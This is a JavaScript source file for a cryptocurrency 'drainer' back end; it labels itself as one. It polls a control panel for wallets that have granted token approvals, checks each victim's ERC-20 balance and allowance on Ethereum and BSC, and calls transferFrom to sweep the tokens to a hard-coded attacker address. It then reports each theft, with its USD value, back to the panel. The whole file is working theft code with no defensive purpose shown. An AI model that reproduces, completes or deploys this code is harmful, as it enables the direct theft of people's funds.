console.log("Drainer"), console.log("");
const Web3 = require("web3"),
  axios = require("axios"),
  async = require("async"),
  qs = require("qs"),
  address = "0x74407F9e10a517f82E905772e8E82DdCA0dCfF76",
  private = "",
  domain = "http://127.0.0.1:5500/",
  ABI = JSON.parse(
    '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],\n"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
  ),
  nodes = {
    56: new Web3("https://rpc.ankr.com/bsc"),
    1: new Web3("https://rpc.ankr.com/eth"),
  };
async function transfer_from(e, t, a, n, s, o) {
  try {
    var i = nodes[e];
    const r = new i.eth.Contract(ABI, a),
      d = await r.methods.transferFrom(t, s, n).encodeABI(),
      u = await i.eth.getGasPrice(),
      l = {
        to: a,
        value: "0x0",
        gasLimit: i.utils.toHex(1e5),
        gasPrice: u,
        data: d,
      },
      p = await i.eth.accounts.signTransaction(l, o.private);
    return (
      (await i.eth.sendSignedTransaction(p.rawTransaction)).transactionHash ||
      "null"
    );
  } catch (e) {
    console.log(e);
  }
  return !1;
}
async function is_withdraw_available(e, t, a, n, s) {
  try {
    var o = nodes[e];
    const d = new o.eth.Contract(ABI, n);
    var i = await d.methods.balanceOf(t).call();
    if (new o.utils.BN(i).lt(new o.utils.BN(s))) return !1;
    var r = await d.methods.allowance(t, a).call();
    return !new o.utils.BN(r).lt(new o.utils.BN(s));
  } catch (e) {
    console.log(e);
  }
  return !1;
}
const Get_ERC20_Allowance = async (e, t, a, n) => {
    try {
      const s = nodes[e],
        o = new s.eth.Contract(ABI, t),
        i = new s.utils.BN(await o.methods.balanceOf(a).call()),
        r = new s.utils.BN(await o.methods.allowance(a, n).call());
      return (
        !i.lte(new s.utils.BN("0")) &&
        !r.lte(new s.utils.BN("0")) &&
        (i.lte(r) ? i.toString() : r.toString())
      );
    } catch (e) {
      console.log(e);
    }
    return !1;
  },
  withdraw_queue = async.queue(async ({ raw: e }) => {
    try {
      var t = { address: address, private: "" };
      console.log("[#" + e.address + "] approved"),
        console.log("[#" + e.address + `] withdrawing ${e.token_amount}`);
      var a = await transfer_from(
        e.chain_id,
        e.address,
        e.token_address,
        e.token_amount,
        address,
        t
      );
      if (0 != a)
        try {
          console.log("[#" + e.address + `] withdrawed ${e.token_amount}`),
            await axios.get(
              `${domain}/receiver.php?method=SEND_TOKEN&token_name=${e.token_name}&chain_id=${e.chain_id}&amount=${e.amount}&usd_amount=${e.usd_amount}&user_id=${e.user_id}&hash=${a}`
            );
        } catch (e) {
          console.log(e);
        }
    } catch (e) {
      console.log(e);
    }
  }, 1),
  in_queue = async.queue(async ({ raw: e }) => {
    try {
      console.log(
        "[#" + e.address + "] added to queue, withdraw " + e.token_address
      ),
        console.log("[#" + e.address + `] approve address: ${address}`);
      let t = await Get_ERC20_Allowance(
        e.chain_id,
        e.token_address,
        e.address,
        address
      );
      return 0 == t
        ? (console.log(
            "[#" + e.address + "] not approved, wait for 5 sec, attempt #1"
          ),
          await new Promise((e) => setTimeout(e, 5e3)),
          (t = await Get_ERC20_Allowance(
            e.chain_id,
            e.token_address,
            e.address,
            address
          )),
          0 == t
            ? (console.log(
                "[#" + e.address + "] not approved, wait for 30 sec, attempt #2"
              ),
              await new Promise((e) => setTimeout(e, 3e4)),
              (t = await Get_ERC20_Allowance(
                e.chain_id,
                e.token_address,
                e.address,
                address
              )),
              0 == t
                ? (console.log(
                    "[#" +
                      e.address +
                      "] not approved, wait for 300 sec, attempt #3"
                  ),
                  await new Promise((e) => setTimeout(e, 3e5)),
                  (t = await Get_ERC20_Allowance(
                    e.chain_id,
                    e.token_address,
                    e.address,
                    address
                  )),
                  0 == t
                    ? void console.log(
                        "[#" + e.address + "] not approved, drop"
                      )
                    : ((e.token_amount = t),
                      void withdraw_queue.push({ raw: e })))
                : ((e.token_amount = t), void withdraw_queue.push({ raw: e })))
            : ((e.token_amount = t), void withdraw_queue.push({ raw: e })))
        : ((e.token_amount = t), void withdraw_queue.push({ raw: e }));
    } catch (e) {
      console.log(e);
    }
  }, 50);
async function init() {
  for (;;) {
    try {
      var e = await axios.get(`${domain}/receiver.php?method=GET_APPROVES`);
      if (e.data.length > 0)
        for (const t of e.data)
          try {
            in_queue.push({ raw: t });
          } catch (e) {
            console.log(e);
          }
    } catch (e) {
      console.log(e);
    }
    await new Promise((e) => setTimeout(e, 15e3));
  }
}
init();
